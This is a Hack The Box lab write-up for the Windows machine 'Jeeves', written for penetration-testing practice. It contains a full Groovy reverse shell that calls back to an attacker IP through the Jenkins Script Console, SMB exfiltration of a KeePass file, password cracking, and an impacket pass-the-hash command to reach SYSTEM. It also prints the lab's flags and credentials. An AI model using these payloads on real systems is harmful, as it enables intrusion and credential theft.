# HTB - Jeeves

## Machine Info

|Field|Details|
|---|---|
|OS|Windows (10)|
|Difficulty|Medium|
|IP|10.129.228.112|
|User|kohsuke|
|User flag|`e3232272596fb47950d59c4cf1e7066a`|
|Root flag|`afbc5bd4b615a60648cec41c6ac92530`|

## Tags

#htb #windows #jenkins #groovy #keepass #pass-the-hash #alternate-data-stream #oscp-like

---

## Attack Path Overview

```
Nmap → port 50000 (Jenkins at /askjeeves)
→ Jenkins Script Console → Groovy reverse shell → kohsuke
→ user flag
→ SeImpersonatePrivilege (noted but not needed)
→ CEH.kdbx on disk → SMB exfil → keepass2john → john → moonshine1
→ kpcli → NTLM hash in KeePass entry
→ impacket-psexec Pass-the-Hash → SYSTEM
→ hm.txt:root.txt (ADS) → root flag
```

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate 10000 10.129.228.112
nmap -sV -sC -p 80,135,445,50000 10.129.228.112
```

**4 open TCP ports:**

|Port|Service|
|---|---|
|80|HTTP (IIS - fake error page)|
|135|MSRPC|
|445|SMB|
|50000|HTTP (Jetty - Jenkins)|

### Web Enumeration

Port 80 returns a fake "HTTP 404" error page — a decoy.

Port 50000 hosts a Jenkins automation server at `/askjeeves`:

```
http://10.129.228.112:50000/askjeeves
```

No authentication required — Jenkins is accessible without login.

---

## Foothold — Jenkins Script Console RCE

Jenkins has a built-in **Script Console** that executes Groovy code server-side. Navigate to:

```
http://10.129.228.112:50000/askjeeves/script
```

### Verify execution context

```groovy
println "whoami".execute().text
// jeeves\kohsuke
```

### Groovy Reverse Shell

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Execute in Script Console:

```groovy
String host="10.10.17.240";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try{p.exitValue();break;}catch(Exception e){}
}
p.destroy();s.close();
```

Shell received as `jeeves\kohsuke`.

---

## User Flag

```cmd
type C:\Users\kohsuke\Desktop\user.txt
# e3232272596fb47950d59c4cf1e7066a
```

### Privilege Check

```cmd
whoami /priv
```

Notable privilege: **SeImpersonatePrivilege** — token impersonation attacks possible (JuicyPotato/PrintSpoofer), but not needed here.

---

## Privilege Escalation — KeePass → Pass-the-Hash → SYSTEM

### Step 1: Locate KeePass Database

```cmd
dir /s /b C:\Users\kohsuke\*.kdbx
# C:\Users\kohsuke\Documents\CEH.kdbx
```

### Step 2: Exfiltrate CEH.kdbx via SMB

On Kali:

```bash
impacket-smbserver share . -smb2support
```

On target:

```cmd
copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.17.240\share\
```

### Step 3: Crack KeePass Master Password

```bash
keepass2john CEH.kdbx > ceh.hash
john ceh.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Master password:** `moonshine1`

### Step 4: Extract NTLM Hash from KeePass

```bash
kpcli --kdb CEH.kdbx
# password: moonshine1
```

```
kpcli:/> cd CEH
kpcli:/CEH> ls
kpcli:/CEH> show -f 0
```

Output:

```
Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

NTLM hash format: `LM:NT`

- NT hash: `e0fb1fb85756c24235ff238cbe81fe00`

### Step 5: Pass-the-Hash → SYSTEM

```bash
impacket-psexec Administrator@10.129.228.112 \
  -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

Shell received as `nt authority\system`.

---

## Root Flag — Alternate Data Stream (ADS)

The root flag is not in the expected location:

```cmd
type C:\Users\Administrator\Desktop\root.txt
# The system cannot find the file specified.
```

Check for hidden Alternate Data Streams:

```cmd
dir /r C:\Users\Administrator\Desktop
```

Output:

```
12/24/2017  03:51 AM    36 hm.txt
                        34 hm.txt:root.txt:$DATA
```

The flag is hidden inside an ADS attached to `hm.txt`:

```cmd
more < C:\Users\Administrator\Desktop\hm.txt:root.txt
# afbc5bd4b615a60648cec41c6ac92530
```

---

## Key Takeaways

- **Jenkins Script Console = instant RCE** — unauthenticated Jenkins is a critical finding; Groovy gives full OS command execution
- **KeePass databases on disk** — always search for `.kdbx` files; they often contain credentials or hashes
- **Pass-the-Hash** — NTLM hashes stored in password managers can be used directly without cracking
- **Alternate Data Streams (ADS)** — Windows NTFS supports hidden data streams attached to files; `dir /r` reveals them; use `more <` to read them
- **SeImpersonatePrivilege** — present but not needed here; in other scenarios this would be the privesc path via JuicyPotato/PrintSpoofer

## Credentials Summary

|User|Credential|Source|
|---|---|---|
|kohsuke|—|Jenkins Script Console (no creds needed)|
|Administrator|e0fb1fb85756c24235ff238cbe81fe00 (NTLM)|CEH.kdbx → moonshine1|

## ADS Cheat Sheet

```cmd
# List all ADS on a file/directory
dir /r <path>

# Read ADS content
more < file.txt:stream_name

# PowerShell alternative
Get-Item -Path file.txt -Stream *
Get-Content -Path file.txt -Stream root.txt
```